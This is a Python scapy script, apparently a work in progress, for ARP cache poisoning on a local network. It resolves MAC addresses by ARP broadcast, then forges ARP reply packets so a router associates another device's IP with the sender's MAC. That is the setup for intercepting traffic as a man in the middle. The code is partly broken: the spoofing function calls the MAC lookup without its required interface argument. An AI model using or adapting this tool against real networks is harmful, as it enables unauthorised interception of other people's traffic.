import scapy.all as scapy
import argparse 
import time

def get_mac(ip_address, interface, retries=3, timeout=2):
    """
    Gets the MAC address for a given IP, retrying multiple times if it fails.
    """
    print(f"--- [INFO] Resolving MAC for {ip_address} on {interface}...")

    arp_request = scapy.ARP(pdst=ip_address)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast / arp_request

    for i in range(retries):
        try:
            # Send the packet and wait for a response
            answered_list = scapy.srp(
                arp_request_broadcast,
                iface=interface,
                timeout=timeout,
                verbose=False
            )[0]

            if answered_list:
                mac = answered_list[0][1].hwsrc
                print(f"--- [SUCCESS] MAC found: {mac}")
                return mac

        except Exception as e:
            print(f"--- [WARN] Scapy error on attempt {i + 1}/{retries}: {e}")

        # If we get here, it means no answer was received on this attempt
        if i < retries - 1:
            print(f"--- [WARN] No reply on attempt {i + 1}/{retries}. Retrying...")
            time.sleep(1) # Wait a second before the next attempt

    # If the loop finishes without returning, it has failed all retries
    print(f"--- [ERROR] Failed to resolve MAC for {ip_address} after {retries} attempts.")
    return None

def send_spoof_packet(target_ip, spoof_ip):
    """
    This function takes two arguments; the ip of the arp poisoning target, and the ip of the device being spoofed.
    First, collect the target_ip's mac adress with the get_mac util function.
    Then, use scapy.ARP() to build the malicious packet. This packet is an "answer"; we are asserting to the network's ARP table the new,
    impersonated mac address which the router thinks is the phone. 
    Finally, send the packet to the network with scapy.send()
    """

    target_mac = get_mac(target_ip)
    print(f"Target mac: {target_mac}")


    # Poison the router ARP cache
    # op = 2; this is an answer, not a request
    arp_packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)

    # Send packet to network
    scapy.send(arp_packet, verbose=False)

def get_local_ip():
    """
    Get local IP using Scapy routing
    """
    
    try:
        # Get the IP of the interface used for default route
        local_ip = scapy.get_if_addr(scapy.conf.iface)
        return local_ip
    except:
        return None
    
print(get_local_ip())
from scapy.all import conf

# Get default route
default_route = conf.route.route("0.0.0.0")
gateway_ip = default_route[2]
print(f"Router IP: {gateway_ip}")

print(get_mac("10.0.0.83", interface="eth0"))